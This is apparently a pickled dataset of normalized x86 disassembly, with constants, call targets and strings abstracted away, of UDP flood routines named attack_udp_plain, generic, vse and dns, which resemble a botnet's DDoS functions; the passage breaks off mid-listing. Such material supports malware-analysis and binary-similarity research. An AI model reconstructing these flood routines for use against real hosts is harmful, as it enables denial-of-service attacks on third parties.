S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~AL,[ESP+0]\nMOV~ESI,[ESP+0]\nMOV~[ESP+0],AL\nMOV~BL,[ESP+0]\nPUSH~0\nMOVZX~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOVZX~EBX,BL\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AX\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AX\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nPUSH~<STR>\nMOV~EDI,EAX\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~EBP,EAX\nCMP~EAX,0\nJZ~FOO\nMOV~[ESP+0],0\nSUB~ESP,0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nPUSH~0\nPUSH~EBP\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJNZ~FOO\nSUB~ESP,0\nPUSH~EBP\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nMOV~[ESP+0],0\nJMP~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EDX,[ESP+0]\nMOV~[EDX+EBX*4],EAX\nMOV~EAX,[ESP+0]\nMOV~EBX,[EDX+EAX*4]\nMOV~BYTEPTR[EBX],0\nLEA~ESI,[EBX+0]\nMOV~CL,[ESP+0]\nMOV~[EBX+0],0\nMOV~[EBX+0],CL\nMOV~AX,[ESP+0]\nROR~AX,0\nMOV~[EBX+0],AX\nMOV~AL,[ESP+0]\nADD~ESP,0\nMOV~[EBX+0],AL\nCMP~[ESP+0],0\nJZ~FOO\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nMOV~EDX,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~[EBX+0],EDX\nIMUL~EAX,[ESP+0],0\nMOV~EAX,[EAX+ECX+0]\nMOV~[EBX+0],EAX\nMOV~AX,[ESP+0]\nROR~AX,0\nMOV~[EBX+0],AX\nMOV~EAX,[ESP+0]\nROR~AX,0\nMOV~[ESI+0],AX\nMOV~EAX,[ESP+0]\nROR~AX,0\nMOVZX~EAX,AX\nMOV~[ESI+0],EAX\nMOV~AL,[ESI+0]\nAND~EAX,0\nOR~EAX,0\nMOV~[ESI+0],AL\nMOV~AL,[ESI+0]\nMOV~CL,[ESP+0]\nMOV~DL,[ESP+0]\nAND~ECX,0\nAND~EAX,0\nSHL~ECX,0\nAND~EDX,0\nSHL~EDX,0\nOR~EAX,ECX\nMOV~CL,[ESP+0]\nOR~EAX,EDX\nAND~ECX,0\nMOV~DL,[ESP+0]\nSHL~ECX,0\nAND~EAX,0\nAND~EDX,0\nOR~EAX,ECX\nSHL~EDX,0\nMOV~ECX,EDI\nOR~EAX,EDX\nMOV~DL,[ESP+0]\nAND~EDX,0\nAND~EAX,0\nADD~EDX,EDX\nAND~ECX,0\nOR~EAX,EDX\nOR~EAX,ECX\nMOV~[ESI+0],AL\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nCALL~FOO\nMOV~[EBX+0],0\nAND~EAX,0\nMOV~[EBX+0],0\nADD~AX,0\nMOV~[EBX+0],0\nROR~AX,0\nMOV~[EBX+0],0\nMOV~[EBX+0],AX\nCALL~FOO\nMOV~[EBX+0],0\nMOV~[EBX+0],EAX\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nINC~[ESP+0]\nMOVZX~EAX,[ESP+0]\nMOV~EBX,[ESP+0]\nMOV~[ESP+0],EAX\nCMP~EBX,EAX\nJL~FOO\nMOV~[ESP+0],0\nJMP~FOO\nMOV~EDX,[ESP+0]\nMOV~ESI,[EDX+EAX*4]\nIMUL~EAX,,0\nADD~EAX,[ESP+0]\nLEA~EDI,[ESI+0]\nCMP~[EAX+0],0\nJA~FOO\nMOV~EBX,[EAX+0]\nCALL~FOO\nROR~BX,0\nROR~EBX,0\nROR~BX,0\nIMUL~ECX,[ESP+0],0\nMOV~EDX,[ESP+0]\nMOVZX~ECX,[ECX+EDX+0]\nSHR~EAX,CL\nADD~EBX,EAX\nROR~BX,0\nROR~EBX,0\nROR~BX,0\nMOV~[ESI+0],EBX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[ESI+0],EAX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[ESI+0],AX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[ESI+0],AX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[EDI+0],AX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[EDI+0],EAX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[EDI+0],EAX\nCMP~[ESP+0],0\nJZ~FOO\nCALL~FOO\nMOV~[EDI+0],AX\nMOV~[ESI+0],0\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~ESI\nCALL~FOO\nMOV~[ESI+0],AX\nMOV~[EDI+0],0\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~ECX,[ESP+0]\nIMUL~EDX,[ESP+0],0\nMOV~[EDI+0],AX\nADD~ESP,0\nMOV~AX,[EDI+0]\nMOV~[EDX+ECX+0],AX\nADD~EDX,ECX\nPUSH~0\nPUSH~EDX\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBP\nCALL~FOO\nINC~[ESP+0]\nADD~ESP,0\nMOV~EAX,[ESP+0]\nCMP~EAX,[ESP+0]\nJL~FOO\nJMP~FOO\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p53
L1063L
tp54
a(S'attack_udp_plain'
p55
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~AL,[ESP+0]\nMOV~ESI,[ESP+0]\nMOVZX~EBX,AL\nMOV~EDI,[ESP+0]\nMOV~[ESP+0],AL\nPUSH~0\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],EAX\nPOP~EBP\nPOP~EAX\nPUSH~0\nPUSH~EBX\nCALL~FOO\nMOV~EDX,EDI\nMOVZX~EBX,DL\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nPUSH~0\nMOV~EBP,EAX\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nLEA~EDI,[ESP+0]\nCLD\nMOV~[ESP+0],AL\nXOR~EAX,EAX\nSTOSD~,\nSTOSD~,\nSTOSD~,\nADD~ESP,0\nSTOSD~,\nCMP~BP,0\nJNZ~FOO\nCALL~FOO\nMOV~[ESP+0],AX\nJMP~FOO\nROR~BP,0\nMOV~[ESP+0],BP\nMOV~ESI,[ESP+0]\nXOR~EBP,EBP\nJMP~FOO\nPUSH~EDI\nPUSH~EDI\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EDX,[ESP+0]\nADD~ESP,0\nMOV~[EDX+EBP*4],EAX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nJMP~FOO\nMOV~EAX,[ESP+0]\nROR~AX,0\nMOV~[ESI+0],AX\nPUSH~EBX\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EDX,EAX\nMOV~EAX,[ESP+0]\nADD~ESP,0\nCMP~EDX,0\nMOV~[EAX+EBP*4],EDX\nJZ~FOO\nMOV~AX,[ESP+0]\nMOV~[ESP+0],0\nMOV~[ESP+0],AX\nLEA~EAX,[ESP+0]\nMOV~[ESP+0],0\nPUSH~ECX\nPUSH~0\nPUSH~EAX\nPUSH~EDX\nCALL~FOO\nADD~ESP,0\nCMP~[ESI+0],0\nJA~FOO\nMOV~EBX,[ESI+0]\nCALL~FOO\nROR~BX,0\nROR~EBX,0\nROR~BX,0\nMOVZX~ECX,[ESI+0]\nSHR~EAX,CL\nADD~EBX,EAX\nROR~BX,0\nROR~EBX,0\nROR~BX,0\nMOV~[ESI+0],EBX\nPUSH~EDX\nPUSH~0\nPUSH~ESI\nADD~ESI,0\nMOV~EDX,[ESP+0]\nPUSH~DWORDPTR[EDX+EBP*4]\nINC~EBP\nCALL~FOO\nADD~ESP,0\nMOVZX~EDI,[ESP+0]\nCMP~EBP,EDI\nJL~FOO\nXOR~EBX,EBX\nJMP~FOO\nMOV~EAX,[ESP+0]\nCMP~[ESP+0],0\nMOV~ESI,[EAX+EBX*4]\nJZ~FOO\nPUSH~EAX\nPUSH~EAX\nMOVZX~EAX,[ESP+0]\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nPUSH~0\nMOVZX~EAX,[ESP+0]\nPUSH~EAX\nPUSH~ESI\nMOV~EDX,[ESP+0]\nPUSH~DWORDPTR[EDX+EBX*4]\nINC~EBX\nCALL~FOO\nADD~ESP,0\nCMP~EBX,EDI\nJL~FOO\nJMP~FOO\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p56
L470L
tp57
a(S'attack_udp_generic'
p58
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~AL,[ESP+0]\nMOV~ESI,[ESP+0]\nMOV~[ESP+0],AL\nMOV~BL,[ESP+0]\nPUSH~0\nMOVZX~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOVZX~EBX,BL\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AX\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AX\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nMOV~EDI,EAX\nMOV~EBP,EDI\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nPUSH~<STR>\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nCMP~DI,0\nJBE~FOO\nMOV~EBP,0\nPUSH~EAX\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nINC~EAX\nJZ~FOO\nMOV~[ESP+0],0\nSUB~ESP,0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nPUSH~0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJNZ~FOO\nSUB~ESP,0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nMOV~[ESP+0],0\nJMP~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EDX,[ESP+0]\nMOV~[EDX+EBX*4],EAX\nMOV~EAX,[ESP+0]\nMOV~EDX,[EDX+EAX*4]\nLEA~EAX,[EBP+0]\nROR~AX,0\nMOV~BYTEPTR[EDX],0\nMOV~[EDX+0],AX\nMOV~BL,[ESP+0]\nLEA~ECX,[EDX+0]\nMOV~[EDX+0],BL\nMOV~AX,[ESP+0]\nROR~AX,0\nMOV~[EDX+0],AX\nMOV~AL,[ESP+0]\nADD~ESP,0\nMOV~[EDX+0],AL\nCMP~[ESP+0],0\nJZ~FOO\nMOV~[EDX+0],0\nMOV~[EDX+0],0\nMOV~EBX,[ESP+0]\nMOV~[EDX+0],EBX\nMOV~EBX,[ESP+0]\nIMUL~EAX,[ESP+0],0\nMOV~EAX,[EAX+EBX+0]\nMOV~[EDX+0],EAX\nMOV~AX,[ESP+0]\nINC~[ESP+0]\nROR~AX,0\nMOV~[EDX+0],AX\nMOV~EAX,[ESP+0]\nROR~AX,0\nMOV~[ECX+0],AX\nLEA~EAX,[EBP+0]\nROR~AX,0\nMOV~[ECX+0],AX\nMOVZX~EAX,[ESP+0]\nMOV~EBX,[ESP+0]\nMOV~[ESP+0],EAX\nCMP~EBX,EAX\nJL~FOO\nMOV~[ESP+0],0\nJMP~FOO\nMOV~EDX,[ESP+0]\nMOV~ESI,[EDX+EAX*4]\nIMUL~EAX,,0\nADD~EAX,[ESP+0]\nLEA~EDI,[ESI+0]\nCMP~[EAX+0],0\nJA~FOO\nMOV~EBX,[EAX+0]\nCALL~FOO\nROR~BX,0\nROR~EBX,0\nROR~BX,0\nIMUL~ECX,[ESP+0],0\nMOV~EDX,[ESP+0]\nMOVZX~ECX,[ECX+EDX+0]\nSHR~EAX,CL\nADD~EBX,EAX\nROR~BX,0\nROR~EBX,0\nROR~BX,0\nMOV~[ESI+0],EBX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[ESI+0],EAX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[ESI+0],AX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[ESI+0],AX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[EDI+0],AX\nCMP~[ESP+0],0\nJZ~FOO\nPUSH~EAX\nPUSH~EAX\nMOVZX~EAX,BP\nPUSH~EAX\nLEA~EAX,[ESI+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nMOV~[ESI+0],0\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~ESI\nCALL~FOO\nMOVZX~EBX,BP\nMOV~[ESI+0],AX\nMOV~[EDI+0],0\nLEA~EAX,[EBX+0]\nADD~EBX,0\nPUSH~EAX\nMOVZX~EAX,[EDI+0]\nPUSH~EAX\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nIMUL~EDX,[ESP+0],0\nMOV~ECX,[ESP+0]\nMOV~[EDI+0],AX\nADD~ESP,0\nMOV~AX,[EDI+0]\nMOV~[EDX+ECX+0],AX\nADD~EDX,ECX\nPUSH~0\nPUSH~EDX\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nPUSH~[ESP+0]\nCALL~FOO\nINC~[ESP+0]\nADD~ESP,0\nMOV~EAX,[ESP+0]\nCMP~EAX,[ESP+0]\nJL~FOO\nJMP~FOO\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p59
L802L
tp60
a(S'attack_udp_vse'
p61
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~AL,[ESP+0]\nMOV~ESI,[ESP+0]\nMOV~[ESP+0],AL\nMOV~BL,[ESP+0]\nPUSH~0\nMOVZX~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOVZX~EBX,BL\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AX\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nPUSH~0\nMOV~EDI,EAX\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nMOV~[ESP+0],AX\nCALL~FOO\nPOP~EAX\nPOP~EDX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~ESI,EAX\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~EBP,EAX\nCMP~EAX,0\nJZ~FOO\nMOV~[ESP+0],0\nSUB~ESP,0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nPUSH~0\nPUSH~EBP\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJNZ~FOO\nSUB~ESP,0\nPUSH~EBP\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nMOV~[ESP+0],0\nJMP~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EDX,[ESP+0]\nMOV~[EDX+EBX*4],EAX\nMOV~EAX,[ESP+0]\nMOV~EDX,[EDX+EAX*4]\nMOV~BYTEPTR[EDX],0\nLEA~ECX,[EDX+0]\nMOV~BL,[ESP+0]\nMOV~[EDX+0],BL\nMOV~EBX,EDI\nMOV~EAX,[ESP+0]\nADD~EAX,0\nROR~AX,0\nMOV~[EDX+0],AX\nMOV~EAX,[ESP+0]\nROR~AX,0\nMOV~[EDX+0],AX\nMOV~AL,[ESP+0]\nMOV~[EDX+0],AL\nADD~ESP,0\nTEST~BL,BL\nJZ~FOO\nMOV~[EDX+0],0\nMOV~[EDX+0],0\nMOV~EAX,<STR>\nMOV~EBX,[ESP+0]\nMOV~[EDX+0],EAX\nIMUL~EAX,[ESP+0],0\nMOV~EAX,[EAX+EBX+0]\nMOV~[EDX+0],EAX\nMOV~EAX,[ESP+0]\nROR~AX,0\nMOV~[EDX+0],AX\nMOV~AX,[ESP+0]\nROR~AX,0\nMOV~[ECX+0],AX\nMOV~EAX,[ESP+0]\nADD~EAX,0\nMOV~[EDX+0],0\nROR~AX,0\nMOV~[ECX+0],AX\nPUSH~ECX\nPUSH~[ESP+0]\nLEA~EAX,[EDX+0]\nPUSH~ESI\nPUSH~EAX\nCALL~FOO\nINC~[ESP+0]\nADD~ESP,0\nMOVZX~EAX,[ESP+0]\nMOV~EBX,[ESP+0]\nMOV~[ESP+0],EAX\nCMP~EBX,EAX\nJL~FOO\nMOV~[ESP+0],0\nJMP~FOO\nMOV~EDX,[ESP+0]\nMOV~ESI,[EDX+EAX*4]\nIMUL~EAX,,0\nADD~EAX,[ESP+0]\nLEA~EDI,[ESI+0]\nCMP~[EAX+0],0\nJA~FOO\nMOV~EBX,[EAX+0]\nCALL~FOO\nROR~BX,0\nROR~EBX,0\nROR~BX,0\nIMUL~ECX,[ESP+0],0\nMOV~EDX,[ESP+0]\nMOVZX~ECX,[ECX+EDX+0]\nSHR~EAX,CL\nADD~EBX,EAX\nROR~BX,0\nROR~EBX,0\nROR~BX,0\nMOV~[ESI+0],EBX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[ESI+0],AX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[ESI+0],AX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[EDI+0],AX\nMOV~[ESI+0],0\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~ESI\nCALL~FOO\nMOV~[ESI+0],AX\nMOV~EAX,[ESP+0]\nADD~EAX,0\nMOV~[EDI+0],0\nPUSH~EAX\nMOVZX~EAX,[EDI+0]\nPUSH~EAX\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nIMUL~EDX,[ESP+0],0\nMOV~ECX,[ESP+0]\nMOV~[EDI+0],AX\nADD~ESP,0\nMOV~AX,[EDI+0]\nMOV~[EDX+ECX+0],AX\nADD~EDX,ECX\nPUSH~0\nPUSH~EDX\nPUSH~0\nMOV~EAX,[ESP+0]\nADD~EAX,0\nPUSH~EAX\nPUSH~ESI\nPUSH~EBP\nCALL~FOO\nINC~[ESP+0]\nADD~ESP,0\nMOV~EAX,[ESP+0]\nCMP~EAX,[ESP+0]\nJL~FOO\nJMP~FOO\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p62
L748L
tp63
a(S'attack_udp_dns'
p64
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~AL,[ESP+0]\nMOV~ESI,[ESP+0]\nMOV~[ESP+0],AL\nMOV~BL,[ESP+0]\nPUSH~0\nMOVZX~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOVZX~EBX,BL\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AX\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AX\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nCALL~FOO\nPOP~EDI\nPOP~EBP\nPUSH~0\nPUSH~0\nCALL~FOO\nPOP~EBX\nPOP~ESI\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nMOV~EBX,EAX\nCALL~FOO\nADD~ESP,0\nTEST~EBX,EBX\nJS~FOO\nPUSH~ECX\nPUSH~0\nLEA~EBP,[ESP+0]\nPUSH~EBP\nPUSH~EBX\nCALL~FOO\nMOV~[ESP],EBX\nMOV~EDI,EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nPOP~EAX\nPOP~EDX\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nPUSH~EDI\nPUSH~EBP\nCALL~FOO\nMOV~ESI,EAX\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nCMP~ESI,0\nJZ~FOO\nLEA~ECX,[EBP+ESI+0]\nMOV~EDX,ESI\nXOR~EBX,EBX\nJMP~FOO\nMOV~AL,[ECX]\nTEST~BL,BL\nJNZ~FOO\nCMP~AL,0\nJZ~FOO\nCMP~AL,0\nJZ~FOO\nMOV~BL,0\nCMP~AL,0\nJZ~FOO\nSUB~EAX,0\nCMP~AL,0\nJA~FOO\nLEA~EAX,[EDI-0]\nCMP~EDX,EAX\nJNZ~FOO\nMOV~EBX,EDX\nPUSH~EAX\nSUB~EBX,ESI\nPUSH~EBX\nLEA~EAX,[ESP+ESI+0]\nPUSH~EAX\nLEA~ESI,[ESP+0]\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+EBX+0],0\nMOV~[ESP],ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nJMP~FOO\nINC~EDX\nINC~ECX\nCMP~EDX,EDI\nJL~FOO\nCALL~FOO\nAND~EAX,0\nCMP~EAX,0\nJZ~FOO\nJB~FOO\nCMP~EAX,0\nJZ~FOO\nCMP~EAX,0\nJNZ~FOO\nJMP~FOO\nMOV~[ESP+0],0\nJMP~FOO\nMOV~[ESP+0],0\nJMP~FOO\nMOV~[ESP+0],0\nJMP~FOO\nMOV~[ESP+0],0\nCMP~[ESP+0],0\nJZ~FOO\nSUB~ESP,0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nMOV~EBP,EAX\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nINC~EAX\nJZ~FOO\nMOV~[ESP+0],0\nSUB~ESP,0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nPUSH~0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJNZ~FOO\nSUB~ESP,0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nMOV~[ESP+0],0\nJMP~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EDX,[ESP+0]\nMOV~[EDX+EBX*4],EAX\nMOV~EAX,[ESP+0]\nMOV~EDX,[EDX+EAX*4]\nMOV~BYTEPTR[EDX],0\nLEA~EBX,[EDX+0]\nMOV~AL,[ESP+0]\nLEA~ESI,[EDX+0]\nMOV~[EDX+0],AL\nMOVZX~AX,[ESP+0]\nLEA~ECX,[EAX+EBP]\nLEA~EAX,[ECX+0]\nROR~AX,0\nMOV~[EDX+0],AX\nMOV~EAX,[ESP+0]\nROR~AX,0\nMOV~[EDX+0],AX\nMOV~AL,[ESP+0]\nADD~ESP,0\nMOV~[EDX+0],AL\nCMP~[ESP+0],0\nJZ~FOO\nMOV~[EDX+0],0\nMOV~[EDX+0],0\nMOV~EAX,<STR>\nMOV~EDI,[ESP+0]\nMOV~[EDX+0],EAX\nMOV~EAX,[ESP+0]\nROR~AX,0\nMOV~[EDX+0],AX\nMOV~AX,[ESP+0]\nROR~AX,0\nMOV~[EBX+0],AX\nLEA~EAX,[ECX+0]\nROR~AX,0\nMOV~[EBX+0],AX\nMOV~EAX,[ESP+0]\nROR~AX,0\nMOV~[EDX+0],AX\nMOV~AL,[ESP+0]\nMOV~[ESI+0],0\nMOV~[ESI+0],0\nMOV~[EDX+0],AL\nMOV~[EDX+0],EDI\nMOVZX~EAX,[ESP+0]\nLEA~ESI,[EDX+EAX+0]\nPUSH~EAX\nLEA~EAX,[EBP+0]\nPUSH~EAX\nLEA~EBX,[ESI+0]\nPUSH~[ESP+0]\nPUSH~EBX\nCALL~FOO\nMOV~EDX,EBX\nMOV~EAX,ESI\nXOR~ECX,ECX\nXOR~EBX,EBX\nADD~ESP,0\nJMP~FOO\nMOV~EDI,[ESP+0]\nCMP~BYTEPTR[ECX+EDI],0\nJNZ~FOO\nMOV~[EAX],BL\nMOV~EAX,EDX\nXOR~EBX,EBX\nJMP~FOO\nINC~EBX\nINC~ECX\nINC~EDX\nCMP~ECX,EBP\nJL~FOO\nMOV~[EAX],BL\nLEA~EAX,[ESI+EBP]\nINC~[ESP+0]\nMOV~[EAX+0],0\nMOV~[EAX+0],0\nMOVZX~EAX,[ESP+0]\nMOV~EBX,[ESP+0]\nMOV~[ESP+0],EAX\nCMP~EBX,EAX\nJL~FOO\nMOV~[ESP+0],0\nJMP~FOO\nMOV~EDX,[ESP+0]\nCMP~[ESP+0],0\nMOV~ESI,[EDX+EAX*4]\nLEA~EDI,[ESI+0]\nJNZ~FOO\nCALL~FOO\nMOV~[ESI+0],AX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[ESI+0],AX\nCMP~[ESP+0],0\nJN